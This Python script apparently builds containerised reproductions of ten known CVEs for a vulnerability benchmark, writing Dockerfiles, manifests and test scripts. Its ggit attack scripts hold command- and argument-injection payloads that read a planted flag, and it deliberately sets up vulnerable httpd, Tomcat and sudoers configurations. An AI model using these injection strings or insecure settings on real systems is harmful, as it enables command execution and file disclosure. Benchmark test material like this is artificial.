#!/usr/bin/env python3
"""One-off: make the 10 migrated functional records fully CVEX v3 conformant.

Pinned bases, vendored + checksummed sources and OS packages (offline builds),
explicit readiness, single-topology records without unused client stubs,
complete manifests, better benign workloads, CVE-2024-21533 exploit fix.
Image pins in cvex.yml are filled in afterwards from the reference build.
"""
import hashlib, shutil, sys
from pathlib import Path

ROOT = Path("/data/vigna/Datasets/CVEX")
RECS = ROOT / "CVEX-records"
V = Path("/data/vigna/Datasets/CVEX/.vend")

DEB = "debian:12-slim@sha256:7c7b2c966bc9ee8cedfeef67e0e279108992c77681fa595db4a9d65c06ccc587"
NODE = "node:18-slim@sha256:f9ab18e354e6855ae56ef2b290dd225c1e51a564f87584b9bd21dd651838830e"
PY = "python:3.10-slim@sha256:6ff506466f8b1e981719b468cc0023b8ef000b983cdec0eafe119d01f379e31d"
TEMURIN = "eclipse-temurin:8-jdk-jammy@sha256:a42a161e0edc7f0d3815bcfa22ce6d969fb48f69d0d17d4a1affd9800b455385"
ES = "vulhub/elasticsearch:1.4.2@sha256:df18e56d6ca11e2f1f81a66f1c4e1b3ff50fe9ede7fcc461be652f06ec7486fa"
HTTPD49 = "httpd:2.4.49@sha256:dcba0d12e2362fb0c50ec524ae8aa1cca4a4ba7216617a57e7bbca20767e79cc"
HTTPD50 = "httpd:2.4.50@sha256:b73a8591d3f1f170568b501ce645dc900f8f1c4c697fbc2420cae3502ab5e02c"

INSTALL_DEBS = ("COPY vendor/debs/ /tmp/debs/\n"
                "RUN cd /tmp/debs && sha256sum -c --quiet SHA256SUMS && dpkg -i *.deb >/dev/null && rm -rf /tmp/debs\n")
OFFLINE_NOTE = ("# Offline build (docker build --network=none): base images pinned by digest,\n"
                "# sources and OS packages vendored under vendor/ and checked against SHA256SUMS.\n")


def w(p, s, mode=None):
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(s)
    if mode:
        p.chmod(mode)


def copytree(src, dst):
    if dst.exists():
        shutil.rmtree(dst)
    shutil.copytree(src, dst)


def sums(d):
    """SHA256SUMS over the regular files directly in d (not subdirectories)."""
    files = sorted(p for p in d.iterdir() if p.is_file() and p.name not in ("SHA256SUMS", ".gitkeep"))
    w(d / "SHA256SUMS", "".join(f"{hashlib.sha256(p.read_bytes()).hexdigest()}  {p.name}\n" for p in files))
    (d / ".gitkeep").unlink(missing_ok=True)


def flag_of(rec):
    import yaml
    return yaml.safe_load((rec / "cvex.yml").read_text())


# ----------------------------------------------------------------- shared parts

def recorder(rec):
    d = rec / "recorder"
    copytree(V / "recorder", d / "vendor" / "debs")
    w(d / "Dockerfile",
      "# Recorder sidecar: tcpdump + strace, sharing the target's network/PID namespaces.\n"
      + OFFLINE_NOTE + f"FROM {DEB}\n" + INSTALL_DEBS +
      "COPY capture.sh /capture.sh\nRUN chmod +x /capture.sh\nENTRYPOINT [\"/capture.sh\"]\n")


def clients(rec):
    for comp, script in (("benign", "interact.sh"), ("attacker", "exploit.sh")):
        d = rec / comp
        copytree(V / "client", d / "vendor" / "debs")
        shutil.rmtree(d / "exploit", ignore_errors=True)
        what = "legitimate client" if comp == "benign" else "attacker client"
        w(d / "Dockerfile",
          f"# The {what} (curl), run once per phase by tools/cvex_run.py.\n"
          + OFFLINE_NOTE + f"FROM {DEB}\n" + INSTALL_DEBS +
          f"COPY {script} /{script}\nRUN chmod +x /{script}\nENTRYPOINT [\"/{script}\"]\n")


def drop_client_stubs(rec):
    for comp in ("benign", "attacker"):
        shutil.rmtree(rec / comp, ignore_errors=True)


def manifest(rec, *, topo, flag, plant, success, channel, trace, ready, single, note=""):
    cve = rec.name
    lo = cve.lower()
    flag_block = (f'flag:\n  value: "{flag}"\n  plant: {plant}\n' if flag else "")
    if single:
        phases = ("phases:                    # single topology: both phases run inside the target\n"
                  "  benign: { run: /benign.sh }\n"
                  "  attack: { run: /attack.sh }\n")
    else:
        phases = ("phases:\n"
                  f"  benign:\n    client: benign             # runs benign/interact.sh\n"
                  f"    image: cvex/{lo}-benign@sha256:PENDING\n    ip: 10.13.0.30\n"
                  f"  attack:\n    client: attacker           # runs attacker/exploit.sh, must emit the flag\n"
                  f"    image: cvex/{lo}-attacker@sha256:PENDING\n    ip: 10.13.0.20\n")
    w(rec / "cvex.yml",
      f"cvex_version: 3\ncve: {cve}\ntopology: {topo}\nnetwork:\n  subnet: 10.13.0.0/24\n\n"
      f"{flag_block}success: {success}\n"
      f"capture:\n  flag_channel: {channel}\n  tls_intercept: false\n  tls_ports: []\n\n"
      "build:\n  offline: true             # every image builds with --network=none\n\n"
      f"services:\n  target:\n    image: cvex/{lo}-target@sha256:PENDING\n    ip: 10.13.0.10\n"
      f"    trace: {trace}\n    ready: \"{ready}\"\n\n"
      f"recorder:\n  image: cvex/{lo}-recorder@sha256:PENDING\n\n"
      f"{phases}\nlimits:\n  wall_clock_seconds: 600\n" + (f"\n{note}" if note else ""))


def compose(rec, *, flag, single, port):
    lo = rec.name.lower()
    env = f'    environment: [ "CVEX_FLAG={flag}" ]\n' if flag else ""
    s = (f"# Reference compose for {rec.name} (derived from cvex.yml). tools/cvex_run.py drives the\n"
         "# benign/attack phases and the capture; this file is for manual use.\n"
         f"name: cvex-{lo}\nservices:\n  target:\n    build: {{ context: ./target, network: none }}\n{env}"
         "    networks: { cvexnet: { ipv4_address: 10.13.0.10 } }\n"
         + ("" if single else f"    expose: [ \"{port}\" ]\n") +
         "  recorder:\n    build: { context: ./recorder, network: none }\n"
         "    network_mode: \"service:target\"\n    pid: \"service:target\"\n"
         "    cap_add: [ NET_ADMIN, NET_RAW, SYS_PTRACE ]\n    volumes: [ \"./_out:/out\" ]\n"
         "    environment: [ \"PHASE=attack\", \"OUTDIR=/out\" ]\n")
    if not single:
        for comp, ip, prof in (("benign", "10.13.0.30", "benign"), ("attacker", "10.13.0.20", "attack")):
            s += (f"  {comp}:\n    build: {{ context: ./{comp}, network: none }}\n    profiles: [ {prof} ]\n"
                  f"    environment: [ \"TARGET=target\", \"PORT={port}\" ]\n"
                  f"    networks: {{ cvexnet: {{ ipv4_address: {ip} }} }}\n")
    s += "networks:\n  cvexnet: { ipam: { config: [ { subnet: 10.13.0.0/24 } ] } }\n"
    w(rec / "compose.yml", s)


# ----------------------------------------------------------------- C targets (bash, sudo)

def c_target(rec, *, tarball, header, build, copy, check, extra, trace):
    t = rec / "target"
    sums(t / "vendor")
    copytree(V / "build", t / "vendor" / "build-debs")
    copytree(V / "strace-deb", t / "vendor" / "debs")
    w(t / "Dockerfile",
      header + OFFLINE_NOTE +
      f"FROM {DEB} AS build\n"
      "COPY vendor/ /vendor/\n"
      "RUN cd /vendor && sha256sum -c --quiet SHA256SUMS \\\n"
      " && cd /vendor/build-debs && sha256sum -c --quiet SHA256SUMS && dpkg -i *.deb >/dev/null\n"
      f"RUN cd /tmp && tar xzf /vendor/{tarball} && {build}\n\n"
      f"FROM {DEB}\n" + INSTALL_DEBS + copy +
      f"RUN {check}\n" + extra +
      "COPY plant-flag.sh /usr/local/bin/plant-flag.sh\n"
      "COPY attack.sh /attack.sh\nCOPY benign.sh /benign.sh\n"
      "RUN chmod +x /usr/local/bin/plant-flag.sh /attack.sh /benign.sh\n"
      "ENV CVEX_FLAG=CVEX{placeholder}\n"
      "CMD [\"sh\",\"-c\",\"/usr/local/bin/plant-flag.sh && touch /ready && exec sleep infinity\"]\n")


def cve_2014_7186():
    rec = RECS / "CVE-2014-7186"
    c_target(rec, tarball="bash-4.3.tar.gz",
             header="# CVE-2014-7186: out-of-bounds access in the here-document \"redir_stack\" of bash <= 4.3.\n"
                    "# A command with many here-doc redirections crashes the parser.\n",
             build="cd bash-4.3 && ./configure >/dev/null && make -j4 >/dev/null",
             copy="COPY --from=build /tmp/bash-4.3/bash /usr/local/bin/bash-vuln\n",
             check="! ldd /usr/local/bin/bash-vuln | grep 'not found'",
             extra="", trace="bash-vuln")
    drop_client_stubs(rec); recorder(rec)
    manifest(rec, topo="single", flag=None, plant=None, success="crash", channel="none",
             trace="bash-vuln", ready="file:/ready", single=True,
             note="# crash-class: success is a crash witness on the traced target process,\n"
                  "# observed only in the attack phase (CVEX_v3_DESIGN.md section 2.3).\n")
    compose(rec, flag=None, single=True, port=0)


SUDO_PREFIX = "--prefix=/usr/local --sysconfdir=/etc --without-sendmail --disable-hardening --without-pam"


def sudo_record(cve, ver, sudoers, header):
    rec = RECS / cve
    m = flag_of(rec)
    c_target(rec, tarball=f"sudo-{ver}.tar.gz", header=header,
             build=(f"cd sudo-{ver} && ./configure {SUDO_PREFIX} >/dev/null \\\n"
                    " && make -j4 >/dev/null && make install DESTDIR=/stage >/dev/null"),
             copy="COPY --from=build /stage/usr/local/ /usr/local/\n",
             check="test -u /usr/local/bin/sudo && ! ldd /usr/local/bin/sudo | grep 'not found'",
             extra=("RUN useradd -m -s /bin/bash hacker" + (" && echo 'motd' > /etc/motd" if "motd" in sudoers else "") + " \\\n"
                    f" && printf '{sudoers}' > /etc/sudoers \\\n"
                    " && chown root:root /etc/sudoers && chmod 0440 /etc/sudoers\n"),
             trace="sudo")
    drop_client_stubs(rec); recorder(rec)
    manifest(rec, topo="single", flag=m["flag"]["value"], plant="file:/root/flag:0600", success="flag",
             channel="stdout", trace="sudo", ready="file:/ready", single=True)
    compose(rec, flag=m["flag"]["value"], single=True, port=0)


def cve_2019_14287():
    sudo_record("CVE-2019-14287", "1.8.27",
                "Defaults !requiretty\\nroot ALL=(ALL:ALL) ALL\\nhacker ALL=(ALL, !root) NOPASSWD: /bin/cat\\n",
                "# CVE-2019-14287: sudo < 1.8.28 lets \"sudo -u#-1\" run as root even when sudoers\n"
                "# forbids root (Runas \"!root\"). Built from the vulnerable sudo 1.8.27 source.\n")


def cve_2023_22809():
    sudo_record("CVE-2023-22809", "1.9.12p1",
                "Defaults !requiretty\\nroot ALL=(ALL:ALL) ALL\\nhacker ALL=(root) NOPASSWD: sudoedit /etc/motd\\n",
                "# CVE-2023-22809: sudoedit (sudo <= 1.9.12p1) lets a user with sudoedit rights for\n"
                "# one file edit arbitrary files by injecting \"-- <path>\" via the EDITOR/SUDO_EDITOR\n"
                "# variables. Built from the vulnerable sudo 1.9.12p1 source.\n")


# ----------------------------------------------------------------- ggit (node)

GIT_FIXTURE = (
    "# local git fixtures for the workloads (no network): a bare \"origin\" with a tagged\n"
    "# commit, and a working clone of it\n"
    "RUN git config --global user.email cvex@example.invalid && git config --global user.name cvex \\\n"
    " && git config --global init.defaultBranch master \\\n"
    " && git init -q /opt/repos/src && cd /opt/repos/src && echo demo > README \\\n"
    " && git add README && git commit -qm init && git tag v1.0.0 \\\n"
    " && git clone -q --bare /opt/repos/src /opt/repos/demo.git \\\n"
    " && git clone -q /opt/repos/demo.git /opt/exploit/work\n")


def ggit_record(cve, header, benign_js, attack_js, benign_sh, attack_sh):
    rec = RECS / cve
    m = flag_of(rec)
    t = rec / "target"
    npm = t / "vendor" / "npm"
    if npm.exists():
        shutil.rmtree(npm)
    npm.mkdir(parents=True)
    for f in ("package.json", "package-lock.json"):
        shutil.copy(V / "npm" / f, npm / f)
    shutil.move(str(t / "vendor" / "ggit-2.4.12.tgz"), npm / "ggit-2.4.12.tgz")
    shutil.copytree(V / "npm" / "npm-cache", npm / "npm-cache")
    sums(npm)
    (t / "vendor" / ".gitkeep").unlink(missing_ok=True)
    copytree(V / "node", t / "vendor" / "debs")
    w(t / "Dockerfile",
      header + OFFLINE_NOTE + f"FROM {NODE}\n" + INSTALL_DEBS +
      "WORKDIR /opt/exploit\n"
      "COPY vendor/npm/ /opt/exploit/\n"
      "RUN sha256sum -c --quiet SHA256SUMS \\\n"
      " && npm ci --offline --no-audit --no-fund --cache /opt/exploit/npm-cache >/dev/null \\\n"
      " && rm -rf /opt/exploit/npm-cache\n" + GIT_FIXTURE +
      "COPY attack.js benign.js /opt/exploit/\n"
      "COPY plant-flag.sh /usr/local/bin/plant-flag.sh\n"
      "COPY attack.sh /attack.sh\nCOPY benign.sh /benign.sh\n"
      "RUN chmod +x /usr/local/bin/plant-flag.sh /attack.sh /benign.sh\n"
      "ENV CVEX_FLAG=CVEX{placeholder}\n"
      "CMD [\"sh\",\"-c\",\"/usr/local/bin/plant-flag.sh && touch /ready && exec sleep infinity\"]\n")
    w(t / "benign.js", benign_js)
    w(t / "attack.js", attack_js)
    w(t / "benign.sh", benign_sh, 0o755)
    w(t / "attack.sh", attack_sh, 0o755)
    drop_client_stubs(rec); recorder(rec)
    manifest(rec, topo="single", flag=m["flag"]["value"], plant="file:/flag", success="flag",
             channel="stdout", trace="node", ready="file:/ready", single=True)
    compose(rec, flag=m["flag"]["value"], single=True, port=0)


CAPTURE_JS = """const fs = require("fs");
const done = () => {
  try {
    const f = fs.readFileSync("/opt/exploit/captured", "utf8").trim();
    if (f) { console.log("CVEX_FLAG=" + f); process.exit(0); }
  } catch (e) {}
  console.error("exploit-failed"); process.exit(1);
};
"""


def cve_2024_21532():
    ggit_record(
        "CVE-2024-21532",
        "# Vulnerable npm package ggit 2.4.12 (CVE-2024-21532): command injection in fetchTags().\n",
        benign_js="""// Legitimate use of ggit.fetchTags: pull the tags of branch "master" from the
// repository's origin (a local bare repository, see the Dockerfile).
const { fetchTags } = require("ggit");
fetchTags("master").then(
  () => console.log("benign fetchTags done"),
  (e) => { console.log("benign fetchTags failed: " + e); process.exit(1); });
""",
        attack_js="""// CVE-2024-21532: fetchTags() concatenates its argument into a shell command
// ("git pull origin <branch> --tags"), allowing command injection. We inject a
// read of the planted /flag.
const { fetchTags } = require("ggit");
""" + CAPTURE_JS + """fetchTags("; cat /flag > /opt/exploit/captured 2>/dev/null #").then(done, done);
""",
        benign_sh="#!/bin/sh\ncd /opt/exploit/work && node /opt/exploit/benign.js\n",
        attack_sh="#!/bin/sh\ncd /opt/exploit/work && node /opt/exploit/attack.js\n")


def cve_2024_21533():
    ggit_record(
        "CVE-2024-21533",
        "# Vulnerable npm package ggit 2.4.12 (CVE-2024-21533): argument injection in\n"
        "# cloneRepo() (the repository URL is passed unchecked to \"git clone\").\n",
        benign_js="""// Legitimate use of ggit.cloneRepo: clone a repository (a local bare repository,
// see the Dockerfile) into a new folder.
const { cloneRepo } = require("ggit");
cloneRepo({ url: "file:///opt/repos/demo.git", folder: "/tmp/cvex-clone" }).then(
  () => console.log("benign cloneRepo done"),
  (e) => { console.log("benign cloneRepo failed: " + e); process.exit(1); });
""",
        attack_js="""// CVE-2024-21533: cloneRepo() builds "git clone --depth 1 <url> <folder>" from
// unchecked options, so a "url" that starts with "--upload-pack=" injects an
// option that runs an arbitrary command (the public proof of concept). We use it
// to read the planted /flag.
const { cloneRepo } = require("ggit");
""" + CAPTURE_JS + """cloneRepo({
  url: "--upload-pack=$(cat /flag > /opt/exploit/captured)",
  folder: "/tmp/cvex-clone-x"
}).then(done, done);
""",
        benign_sh="#!/bin/sh\ncd /opt/exploit && node /opt/exploit/benign.js\n",
        attack_sh="#!/bin/sh\ncd /opt/exploit && node /opt/exploit/attack.js\n")


# ----------------------------------------------------------------- keras (python)

def cve_2024_3660():
    rec = RECS / "CVE-2024-3660"
    m = flag_of(rec)
    t = rec / "target"
    wh = t / "vendor" / "wheels"
    shutil.copy(V / "requirements.lock", wh / "requirements.lock")
    (wh / "requirements.txt").unlink(missing_ok=True)
    (t / "vendor" / ".gitkeep").unlink(missing_ok=True)
    copytree(V / "py", t / "vendor" / "debs")
    w(t / "Dockerfile",
      "# CVE-2024-3660: Keras/TensorFlow 2.11.1 Lambda-layer unsafe deserialization -> code\n"
      "# execution when a malicious .h5 model is loaded.\n" + OFFLINE_NOTE +
      "# Python wheels are installed with --require-hashes from vendor/wheels/requirements.lock.\n"
      f"FROM --platform=linux/amd64 {PY}\n" + INSTALL_DEBS +
      "WORKDIR /opt/exploit\n"
      "COPY vendor/wheels /wheels\n"
      "RUN pip install --no-cache-dir --no-index --find-links /wheels --require-hashes \\\n"
      "      -r /wheels/requirements.lock >/dev/null && rm -rf /wheels\n"
      "COPY attack.py benign.py /opt/exploit/\n"
      "COPY plant-flag.sh /usr/local/bin/plant-flag.sh\n"
      "COPY attack.sh benign.sh /\n"
      "RUN chmod +x /usr/local/bin/plant-flag.sh /attack.sh /benign.sh\n"
      "ENV CVEX_FLAG=CVEX{placeholder}\n"
      "CMD [\"sh\",\"-c\",\"/usr/local/bin/plant-flag.sh && touch /ready && exec sleep infinity\"]\n")
    drop_client_stubs(rec); recorder(rec)
    manifest(rec, topo="single", flag=m["flag"]["value"], plant="file:/flag", success="flag",
             channel="stdout", trace="python", ready="file:/ready", single=True)
    compose(rec, flag=m["flag"]["value"], single=True, port=0)


# ----------------------------------------------------------------- network records

def network_record(cve, *, dockerfile, plant, trace, port, interact=None):
    rec = RECS / cve
    m = flag_of(rec)
    t = rec / "target"
    if (t / "vendor").exists():
        if any(p.name not in (".gitkeep",) for p in (t / "vendor").iterdir()):
            sums(t / "vendor")
        else:
            shutil.rmtree(t / "vendor")
    w(t / "Dockerfile", dockerfile)
    if interact:
        w(rec / "benign" / "interact.sh", interact, 0o755)
    clients(rec); recorder(rec)
    manifest(rec, topo="target-attacker", flag=m["flag"]["value"], plant=plant, success="flag",
             channel="network", trace=trace, ready=f"tcp:{port}", single=False)
    compose(rec, flag=m["flag"]["value"], single=False, port=port)


HTTPD_CONF = """RUN mkdir -p /var/www/dl && echo 'downloads' > /var/www/dl/index.txt \\
 && echo 'release notes' > /var/www/dl/notes.txt && { \\
      echo 'Alias /dl/ /var/www/dl/'; \\
      echo '<Directory "/var/www/dl/">'; \\
      echo '  Require all granted'; \\
      echo '</Directory>'; \\
      echo '<Directory />'; \\
      echo '  Require all granted'; \\
      echo '</Directory>'; \\
    } >> /usr/local/apache2/conf/httpd.conf
COPY plant-flag.sh /usr/local/bin/plant-flag.sh
RUN chmod +x /usr/local/bin/plant-flag.sh \\
 && printf '#!/bin/sh\\nset -e\\n/usr/local/bin/plant-flag.sh\\nexec httpd-foreground\\n' \\
      > /usr/local/bin/cvex-entry.sh && chmod +x /usr/local/bin/cvex-entry.sh
ENV CVEX_FLAG=CVEX{placeholder}
EXPOSE 80
CMD ["/usr/local/bin/cvex-entry.sh"]
"""

HTTPD_INTERACT = """#!/bin/sh
# Legitimate use of the same server and the same /dl/ alias the attack abuses:
# the home page, files inside the download directory, and a missing file.
TARGET="${TARGET:-target}"; PORT="${PORT:-80}"
BASE="http://$TARGET:$PORT"
for p in / /dl/index.txt /dl/notes.txt /dl/missing.txt /dl/index.txt; do
  curl -s -o /dev/null -w "benign GET $p -> %{http_code}\\n" "$BASE$p" || true
  sleep 1
done
"""


def cve_2021_41773():
    network_record("CVE-2021-41773", plant="file:/opt/secret/flag", trace="httpd", port=80,
                   interact=HTTPD_INTERACT, dockerfile=(
        "# Vulnerable Apache httpd 2.4.49 for CVE-2021-41773 (path traversal / file disclosure).\n"
        "# Official image pinned by digest; no packages or sources fetched at build time.\n"
        f"FROM {HTTPD49}\n\n"
        "# Make 2.4.49 exploitable: a plain Alias to a served directory plus\n"
        "# \"Require all granted\" on the filesystem. The 2.4.49 path-normalization bug then\n"
        "# lets an encoded \"..%2e\" traversal escape the alias and read files outside it.\n"
        + HTTPD_CONF))


def cve_2021_42013():
    network_record("CVE-2021-42013", plant="file:/opt/secret/flag", trace="httpd", port=80,
                   interact=HTTPD_INTERACT, dockerfile=(
        "# Vulnerable Apache httpd 2.4.50 for CVE-2021-42013 (incomplete fix of 2.4.49;\n"
        "# path traversal / file disclosure via double-encoding).\n"
        "# Official image pinned by digest; no packages or sources fetched at build time.\n"
        f"FROM {HTTPD50}\n" + HTTPD_CONF))


def cve_2017_12617():
    network_record("CVE-2017-12617", plant="file:/flag", trace="java", port=8080, dockerfile=(
        "# Vulnerable Apache Tomcat 9.0.0.M1 (CVE-2017-12617): JSP upload via PUT when the\n"
        "# DefaultServlet is writable (readonly=false) -> RCE.\n" + OFFLINE_NOTE +
        f"FROM {TEMURIN}\n"
        "WORKDIR /opt\n"
        "COPY vendor/ /tmp/vendor/\n"
        "RUN cd /tmp/vendor && sha256sum -c --quiet SHA256SUMS \\\n"
        " && tar xzf apache-tomcat-9.0.0.M1.tar.gz -C /opt && mv /opt/apache-tomcat-9.0.0.M1 /opt/tomcat \\\n"
        " && rm -rf /tmp/vendor\n"
        "# enable the vulnerable condition: DefaultServlet readonly=false\n"
        "RUN sed -i 's#<param-name>listings</param-name>#<param-name>readonly</param-name>#' /opt/tomcat/conf/web.xml\n"
        "COPY plant-flag.sh /usr/local/bin/plant-flag.sh\n"
        "RUN chmod +x /usr/local/bin/plant-flag.sh \\\n"
        " && printf '#!/bin/sh\\nset -e\\n/usr/local/bin/plant-flag.sh\\nexec /opt/tomcat/bin/catalina.sh run\\n' > /start.sh \\\n"
        " && chmod +x /start.sh\n"
        "ENV CVEX_FLAG=CVEX{placeholder}\nEXPOSE 8080\nCMD [\"/start.sh\"]\n"),
        interact="""#!/bin/sh
# Legitimate use of the same writable DefaultServlet the attack abuses: browse the
# home page, upload a plain-text file with PUT, read it back, and delete it.
TARGET="${TARGET:-target}"; PORT="${PORT:-8080}"
BASE="http://$TARGET:$PORT"
curl -s -o /dev/null -w "benign GET / -> %{http_code}\\n" "$BASE/"; sleep 1
curl -s -o /dev/null -w "benign PUT /notes.txt -> %{http_code}\\n" -X PUT --data-binary 'meeting at 10' "$BASE/notes.txt"; sleep 1
curl -s -o /dev/null -w "benign GET /notes.txt -> %{http_code}\\n" "$BASE/notes.txt"; sleep 1
curl -s -o /dev/null -w "benign DELETE /notes.txt -> %{http_code}\\n" -X DELETE "$BASE/notes.txt"
""")


def cve_2015_1427():
    network_record("CVE-2015-1427", plant="file:/flag", trace="java", port=9200, dockerfile=(
        "# Vulnerable Elasticsearch 1.4.2 (CVE-2015-1427): Groovy scripting sandbox bypass -> RCE.\n"
        "# vulhub image pinned by digest; no packages or sources fetched at build time. The flag\n"
        "# is planted at container start and readable only by executing a command on the target.\n"
        f"FROM {ES}\n"
        "COPY plant-flag.sh /usr/local/bin/plant-flag.sh\n"
        "RUN chmod +x /usr/local/bin/plant-flag.sh \\\n"
        " && printf '#!/bin/sh\\nset -e\\n/usr/local/bin/plant-flag.sh\\nexec /docker-entrypoint.sh elasticsearch\\n' \\\n"
        "      > /usr/local/bin/cvex-entry.sh && chmod +x /usr/local/bin/cvex-entry.sh\n"
        "ENV CVEX_FLAG=CVEX{placeholder}\nEXPOSE 9200\n"
        "ENTRYPOINT []\nCMD [\"/usr/local/bin/cvex-entry.sh\"]\n"))


ALL = {"CVE-2014-7186": cve_2014_7186, "CVE-2019-14287": cve_2019_14287,
       "CVE-2023-22809": cve_2023_22809, "CVE-2024-21532": cve_2024_21532,
       "CVE-2024-21533": cve_2024_21533, "CVE-2024-3660": cve_2024_3660,
       "CVE-2021-41773": cve_2021_41773, "CVE-2021-42013": cve_2021_42013,
       "CVE-2017-12617": cve_2017_12617, "CVE-2015-1427": cve_2015_1427}

if __name__ == "__main__":
    for cve in (sys.argv[1:] or ALL):
        ALL[cve]()
        print("converted", cve)
